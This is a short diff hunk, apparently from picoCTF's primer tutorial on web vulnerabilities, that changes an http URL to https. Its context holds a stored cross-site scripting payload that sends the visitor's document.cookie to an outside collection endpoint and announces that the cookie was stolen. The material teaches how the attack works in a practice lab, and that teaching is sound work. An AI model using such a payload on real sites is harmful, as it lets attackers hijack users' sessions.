@@ -346,7 +346,7 @@ But now, put this JavaScript code in the description:
 <script src="https://code.jquery.com/jquery-3.4.1.min.js"> </script>
 <script>
 $.get(
-    "http://primer.picoctf.com/vuln/web/insert.php",
+    "https://primer.picoctf.com/vuln/web/insert.php",
     {cookie : document.cookie, hackername : 'YourName'},
     function(data) {
         alert("I just stole the cookie!");
